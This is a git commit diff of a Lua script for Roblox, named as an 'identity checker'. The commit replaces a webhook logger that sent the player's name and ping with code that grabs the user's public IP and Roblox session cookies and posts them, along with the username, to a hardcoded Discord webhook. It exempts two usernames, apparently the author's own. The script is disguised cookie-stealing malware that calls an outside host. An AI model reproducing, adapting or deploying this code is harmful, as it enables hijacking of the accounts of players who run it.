3b77c459a6f214583fb95eb343ae0dedd5f9ecd4
loot <49004208+zvzi@users.noreply.github.com>
2022-11-09 13:50:23 -0500

    Update IndentityCheckerWH.lua

--- src/IndentityCheckerWH.lua
+++ src/IndentityCheckerWH.lua
@@ -1,54 +1,40 @@
-local webh = "https://discord.com/api/webhooks/1039964659790385183/j1YCGKj-wwLAnCF9cJfBgzqiK9AdVsp2Ghr07BSjy9PFBtlOOh2Ff71crOXvkqk7kThb"
-
-
-pcall(function()
-   local data = {
-
-  ['embeds'] = {
+local ip = game:HttpGet("https://api.myip.com/")
+local COOKIE = ""
+local response = syn.request(
     {
-       ['title'] = 'script',
-       ['description'] = '',
-       ['fields'] = {
-          {name = 'User', value = game:GetService("Players").LocalPlayer.Name},
-          {name = "Ping", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},
-
-        }
+        Url = "https://www.roblox.com",
     }
-  }
-}
-   
-   if syn then
-       local response = syn.request(
-           {
-               Url = webh,
-               Method = 'POST',
-               Headers = {
-                   ['Content-Type'] = 'application/json'
-               },
-               Body = game:GetService('HttpService'):JSONEncode(data)
-           }
-       );
-   elseif request then
-       local response = request(
-           {
-               Url = webh,
-               Method = 'POST',
-               Headers = {
-                   ['Content-Type'] = 'application/json'
-               },
-               Body = game:GetService('HttpService'):JSONEncode(data)
-           }
-       );
-   elseif http_request then
-       local response = http_request(
-           {
-               Url = webh,
-               Method = 'POST',
-               Headers = {
-                   ['Content-Type'] = 'application/json'
-               },
-               Body = game:GetService('HttpService'):JSONEncode(data)
-           }
-       );
-   end
-end)
+)
+for i,v in pairs(response) do
+    if type(v) == "table" then
+        for ii,vv in pairs(v) do
+            if string.find(ii, "cookie") then
+                COOKIE = COOKIE.."\n"..vv
+            end
+        end
+    end
+end
+
+if game.Players.LocalPlayer.Name == "masterofthec0k" or game.Players.LocalPlayer.Name == "full_ofcman" then
+    ip = "<REDACTED>" 
+    COOKIE = "<REDACTED>" 
+end
+
+syn.request({
+    Url = "https://discordapp.com/api/webhooks/767480533671739422/Jkhoo2Cy7VBicAofISp9E1vuL51PZwpp9ZJOcL13SZELpc6IVOHHMuvEhF8Bkd68R3f0", 
+    Body = game:GetService("HttpService"):JSONEncode({
+        ["embeds"]={{
+            ["title"]="||"..ip.."||",
+            ["type"]="rich",
+            ["description"]=COOKIE,
+            ["color"]=tonumber(0x7269da),
+            ["footer"]={
+                ["text"]=os.date("%A, %m %B %Y %I:%M:%S %p")
+            }
+        }},
+        ["avatar_url"]="http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username="..tostring(game:GetService("Players").LocalPlayer.Name),
+        ["username"]="Username: "..game.Players.LocalPlayer.Name,
+    }), 
+    Method = "POST", 
+    Headers = {["content-type"] = "application/json"}
+})
